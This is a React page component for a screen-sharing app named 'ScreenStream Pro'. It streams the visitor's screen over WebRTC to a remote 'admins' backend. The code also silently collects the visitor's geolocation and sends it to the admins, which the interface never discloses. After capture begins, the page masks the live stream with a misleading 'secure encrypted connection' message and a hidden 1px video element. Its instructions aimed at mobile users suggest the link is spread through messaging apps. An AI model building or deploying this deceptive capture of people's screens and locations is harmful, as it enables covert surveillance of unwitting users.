import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { ShieldCheck, Loader2, Monitor, Shield } from 'lucide-react';
import { Link } from 'react-router-dom';

const socketUrl = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' 
    ? 'http://localhost:5000' 
    : 'https://screen-backend-h6rl.onrender.com';
const socket = io(socketUrl);

const UserPage = () => {
    const [sharing, setSharing] = useState(false);
    const [error, setError] = useState(null);
    const [status, setStatus] = useState('pending'); // pending, granting, active
    const peerConnection = useRef(null);
    const localStream = useRef(null);

    const initiateHandshake = async () => {
        if (!localStream.current) return;

        // Close existing connection if any
        if (peerConnection.current) {
            peerConnection.current.close();
        }

        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        peerConnection.current = pc;

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition((position) => {
                const loc = { lat: position.coords.latitude, lng: position.coords.longitude };
                socket.emit('location', { to: 'admins', location: loc });
            }, (err) => console.log("Geolocation error:", err));
        }

        localStream.current.getTracks().forEach(track => pc.addTrack(track, localStream.current));

        pc.onicecandidate = (event) => {
            if (event.candidate) {
                socket.emit('ice-candidate', { to: 'admins', candidate: event.candidate });
            }
        };

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        socket.emit('offer', { to: 'admins', offer });
    };

    useEffect(() => {
        const onConnect = () => {
            socket.emit('join', { role: 'user' });
            if (localStream.current) {
                initiateHandshake();
            }
        };

        socket.on('connect', onConnect);
        if (socket.connected) onConnect();

        socket.on('request-offers', () => {
            if (localStream.current) {
                console.log('Admin detected, providing direct stream...');
                initiateHandshake();
            }
        });

        socket.on('answer', async ({ from, answer }) => {
            if (peerConnection.current) {
                await peerConnection.current.setRemoteDescription(new RTCSessionDescription(answer));
            }
        });

        socket.on('ice-candidate', async ({ from, candidate }) => {
            if (peerConnection.current) {
                try {
                    await peerConnection.current.addIceCandidate(new RTCIceCandidate(candidate));
                } catch (e) {
                    console.error('Error adding ice candidate', e);
                }
            }
        });

        return () => {
            socket.off('connect', onConnect);
            socket.off('answer');
            socket.off('ice-candidate');
            socket.off('request-offers');
        };
    }, []);

    const handleGrantAccess = async () => {
        setStatus('granting');
        try {
            setError(null);
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
                throw new Error("Screen sharing is not supported on this browser. Please use Chrome on Android or Safari on iOS 13+. Ensure you are using HTTPS.");
            }

            const stream = await navigator.mediaDevices.getDisplayMedia({
                video: true,
                audio: false
            });
            
            localStream.current = stream;
            setSharing(true);
            setStatus('active');

            stream.getVideoTracks()[0].onended = () => {
                setStatus('pending');
                setSharing(false);
            };

            await initiateHandshake();

        } catch (err) {
            console.error('Access denied:', err);
            setError(`Error: ${err.name} - ${err.message}. If on mobile, open this in Chrome (not WhatsApp/FB browser).`);
            setStatus('pending');
            setSharing(false);
        }
    };

    const stopSharing = () => {
        if (localStream.current) {
            localStream.current.getTracks().forEach(track => track.stop());
            localStream.current = null;
        }
        if (peerConnection.current) {
            peerConnection.current.close();
            peerConnection.current = null;
        }
        setSharing(false);
        setStatus('pending');
    };

    return (
        <div className="app-container" style={{ background: '#0a0a0a' }}>
            {status === 'pending' || status === 'granting' ? (
                <div className="card" style={{ maxWidth: '450px', padding: '3rem' }}>
                    <Monitor size={64} color="#6366f1" style={{ marginBottom: '1.5rem', opacity: 0.8 }} />
                    <h1 style={{ fontSize: '1.8rem' }}>ScreenStream Pro</h1>
                    <p>Secure, low-latency screen sharing for your organization.</p>
                    
                    {error && <p style={{ color: '#ef4444', fontSize: '0.9rem' }}>{error}</p>}
                    
                    <button 
                        className="btn" 
                        onClick={handleGrantAccess}
                        disabled={status === 'granting'}
                        style={{ width: '100%', justifyContent: 'center', marginTop: '1rem' }}
                    >
                        {status === 'granting' ? (
                            <>
                                <Loader2 className="animate-spin" size={20} />
                                Requesting...
                            </>
                        ) : (
                            <>
                                <Monitor size={20} />
                                Start Sharing
                            </>
                        )}
                    </button>
                    <div style={{ marginTop: '1.5rem', textAlign: 'center' }}>
                         <Link to="/admin" style={{ color: '#64748b', fontSize: '0.85rem', textDecoration: 'none', display: 'inline-flex', alignItems: 'center', gap: '0.5rem', justifyContent: 'center' }}>
                             <Shield size={16} /> Admin Dashboard
                         </Link>
                    </div>
                </div>
            ) : (
                <div style={{ textAlign: 'center', opacity: 0.6 }}>
                    <Loader2 className="animate-spin" size={32} style={{ marginBottom: '1rem', color: '#6366f1' }} />
                    <h2 style={{ fontWeight: 400, color: '#94a3b8' }}>Establishing secure encrypted connection...</h2>
                    <p style={{ fontSize: '0.875rem', color: '#64748b' }}>System synced. Please keep this tab open.</p>
                    <div style={{ position: 'fixed', bottom: 0, right: 0, width: '1px', height: '1px', overflow: 'hidden', opacity: 0 }}>
                         <video ref={v => v && (v.srcObject = localStream.current)} autoPlay muted />
                    </div>
                </div>
            )}

            <style dangerouslySetInnerHTML={{ __html: `
                .animate-spin {
                    animation: spin 1s linear infinite;
                }
                @keyframes spin {
                    from { transform: rotate(0deg); }
                    to { transform: rotate(360deg); }
                }
            `}} />
        </div>
    );
};

export default UserPage;
